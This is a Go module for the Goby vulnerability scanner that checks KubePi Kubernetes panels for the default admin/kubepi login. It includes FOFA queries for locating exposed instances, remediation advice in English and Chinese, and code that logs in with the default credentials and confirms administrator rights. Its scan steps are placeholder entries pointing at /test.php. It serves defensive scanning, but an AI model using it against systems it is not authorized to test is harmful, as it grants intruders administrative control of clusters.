package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "KubePi Default Password Vulnerability",
    "Description": "<p>KubePi is a simple and easy-to-use open source Kubernetes visual management panel</p><p>KubePi has a default password vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
    "Product": "KubePi",
    "Homepage": "https://github.com/1Panel-dev/KubePi",
    "DisclosureDate": "2023-08-13",
    "PostTime": "2023-08-13",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"KubePi\" || body=\"/kubepi/css/\" || body=\"kubepi doesn't work\" || header=\"KubePi\" || banner=\"KubePi\"",
    "GobyQuery": "title=\"KubePi\" || body=\"/kubepi/css/\" || body=\"kubepi doesn't work\" || header=\"KubePi\" || banner=\"KubePi\"",
    "Level": "3",
    "Impact": "<p>KubePi has a default password vulnerability, which allows attackers to control the entire platform through the default user and operate core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Modify the default password, preferably containing uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "userList,addUser",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "o3sjeo",
            "show": "attackType=addUser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "sji0adEvn",
            "show": "attackType=addUser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "KubePi 默认密码漏洞",
            "Product": "KubePi",
            "Description": "<p>KubePi 是一款简单易用的开源 Kubernetes 可视化管理面板。</p><p>KubePi 存在默认口令漏洞，攻击者可通过默认口令登陆管理员账号控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>临时解决方案：<br></p><p>1、修改默认口令，密钥最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>KubePi 存在默认口令漏洞，攻击者可通过默认口令登陆管理员账号控制整个平台，使用管理员权限操作核心的功能。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "KubePi Default Password Vulnerability",
            "Product": "KubePi",
            "Description": "<p>KubePi is a simple and easy-to-use open source Kubernetes visual management panel</p><p>KubePi has a default password vulnerability, which allows attackers to control the entire platform through the default JWT user and operate core functions with administrator privileges.</p>",
            "Recommendation": "<p>1. Modify the default password, preferably containing uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>KubePi has a default password vulnerability, which allows attackers to control the entire platform through the default user and operate core functions with administrator privileges.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10823"
}`
	sendPayloadJOIUWEOQH := func(hostInfo *httpclient.FixUrl, uri, postData string) (*httpclient.HttpResponse, error) {
		config := httpclient.NewPostRequestConfig(uri)
		config.FollowRedirect = false
		config.VerifyTls = false
		config.Header.Store("Content-Type", "application/json")
		config.Data = postData
		return httpclient.DoHttpRequest(hostInfo, config)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadJOIUWEOQH(hostInfo, "/kubepi/api/v1/sessions", `{"username":"admin","password":"kubepi"}`)
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `data`) && strings.Contains(resp.Utf8Html, `"isAdministrator": true`) && strings.Contains(resp.Utf8Html, `"success": true`) {
				stepLogs.VulURL = fmt.Sprintf("%s://admin:kubepi@%s",hostInfo.Scheme(), hostInfo.HostInfo)
				return true
			}
			return false
		}, nil,
	))
}
